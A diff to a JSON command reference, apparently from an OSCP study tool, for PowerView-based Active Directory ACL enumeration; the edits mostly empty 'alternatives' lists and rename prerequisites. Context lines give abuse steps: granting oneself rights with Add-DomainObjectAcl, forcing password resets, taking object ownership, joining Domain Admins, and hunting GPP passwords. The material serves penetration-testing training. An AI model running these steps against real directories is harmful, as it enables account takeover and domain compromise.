@@ -44,11 +44,11 @@
         "Check who has rights: Convert-SidToName <SID>"
       ],
       "alternatives": [
-        "Get-Acl",
+        "get-acl",
         "dsacls"
       ],
       "prerequisites": [
-        "Import PowerView"
+        "import-powerview"
       ],
       "troubleshooting": {
         "Module not imported": "Import-Module .\\PowerView.ps1",
@@ -99,11 +99,9 @@
         "Convert all SIDs: Get-ObjectAcl -Identity \"<OBJECT>\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select -ExpandProperty SecurityIdentifier | Convert-SidToName",
         "Abuse GenericAll: Add-DomainGroupMember, Set-DomainUserPassword"
       ],
-      "alternatives": [
-        "Get-ObjectAcl -Identity \"<OBJECT>\" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll'}"
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView",
+        "import-powerview",
         "powerview-get-objectacl"
       ],
       "troubleshooting": {
@@ -146,17 +144,15 @@
         "Use with ACL enumeration: Get-ObjectAcl | select -ExpandProperty SecurityIdentifier | Convert-SidToName",
         "Identify object type: Get-NetUser -Identity <NAME> or Get-NetGroup -Identity <NAME>"
       ],
-      "alternatives": [
-        "[System.Security.Principal.SecurityIdentifier]::new('<SID>').Translate([System.Security.Principal.NTAccount]).Value"
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView"
+        "import-powerview"
       ],
       "troubleshooting": {
         "Module not imported": "Import-Module .\\PowerView.ps1",
         "SID not found": "SID may be from external domain, deleted object, or invalid format"
       },
-      "notes": "SIDs (Security Identifiers) are unique identifiers for AD objects. Format: S-1-5-21-<domain>-<RID>. RID (Relative Identifier) identifies the specific object: 500=Administrator, 512=Domain Admins, 513=Domain Users, etc. Get-ObjectAcl returns SIDs in SecurityIdentifier field - must convert to names for analysis. Batch conversion: Get-ObjectAcl | select -ExpandProperty SecurityIdentifier | Convert-SidToName. OSCP: Essential for ACL enumeration - SIDs are useless until converted to names.",
+      "notes": "SIDs (Security Identifiers) are unique identifiers for AD objects. Format: S-1-5-21-<domain>-<RID>. RID (Relative Identifier) identifies the specific object: 500=Administrator, 512=Domain Admins, 513=Domain Users, etc. Get-ObjectAcl returns SIDs in SecurityIdentifier field - must convert to names for analysis. Batch conversion: Get-ObjectAcl | select -ExpandProperty SecurityIdentifier | Convert-SidToName. OSCP: Essential for ACL enumeration - SIDs are useless until converted to names.\n\nAlternative Techniques:\n- [system.security.principal.securityidentifier]::new('<sid>').translate([system.security.principal.ntaccount]).value",
       "oscp_relevance": "high"
     },
     {
@@ -200,11 +196,9 @@
         "Abuse WriteDACL: Add-DomainObjectAcl -TargetIdentity <OBJECT> -Rights All -PrincipalIdentity <YOUR_USER>",
         "Grant yourself GenericAll, then add to group or reset password"
       ],
-      "alternatives": [
-        "Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty'}"
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView",
+        "import-powerview",
         "powerview-get-objectacl"
       ],
       "troubleshooting": {
@@ -255,11 +249,9 @@
         "Abuse: Set-DomainUserPassword -Identity <USERNAME> -Password (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)",
         "Authenticate as target user with new password"
       ],
-      "alternatives": [
-        "Check for AllExtendedRights (includes ForceChangePassword): Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}"
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView",
+        "import-powerview",
         "powerview-get-objectacl"
       ],
       "troubleshooting": {
@@ -308,11 +300,9 @@
         "Convert SIDs to names",
         "Abuse WriteOwner: (1) Set-DomainObjectOwner -Identity <OBJECT> -OwnerIdentity <YOUR_USER>, (2) Grant yourself GenericAll, (3) Abuse full control"
       ],
-      "alternatives": [
-        "Check for WriteDACL - similar privilege escalation path"
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView",
+        "import-powerview",
         "powerview-get-objectacl"
       ],
       "troubleshooting": {
@@ -364,11 +354,9 @@
         "Check ObjectDN to identify high-value targets",
         "Abuse identified permissions with Add-DomainGroupMember or Set-DomainUserPassword"
       ],
-      "alternatives": [
-        "Manual enumeration: Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}"
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView"
+        "import-powerview"
       ],
       "troubleshooting": {
         "Module not imported": "Import-Module .\\PowerView.ps1",
@@ -422,12 +410,9 @@
         "Look for sensitive data in accessible shares",
         "Check SYSVOL for GPP passwords"
       ],
-      "alternatives": [
-        "icacls \\\\<TARGET>\\<SHARE>",
-        "Get-Acl -Path \\\\<TARGET>\\<SHARE> | Format-List"
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView"
+        "import-powerview"
       ],
       "troubleshooting": {
         "Module not imported": "Import-Module .\\PowerView.ps1",
@@ -472,11 +457,9 @@
       "next_steps": [
         "Convert SID to name: Convert-SidToName <SID>"
       ],
-      "alternatives": [
-        "dsacls \"<USER_DN>\""
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView"
+        "import-powerview"
       ],
       "troubleshooting": {
         "Object not found": "Verify username: Get-NetUser -Identity <USERNAME>"
@@ -520,11 +503,9 @@
       "next_steps": [
         "Check if you can add members: if GenericAll or WriteProperty on 'member' attribute"
       ],
-      "alternatives": [
-        "dsacls \"<GROUP_DN>\""
-      ],
+      "alternatives": [],
       "prerequisites": [
-        "Import PowerView"
+        "import-powerview"
       ],
       "troubleshooting": {},
       "notes": "Critical for privilege escalation. GenericAll on Domain Admins = you can add yourself to the group. Common misconfiguration.",
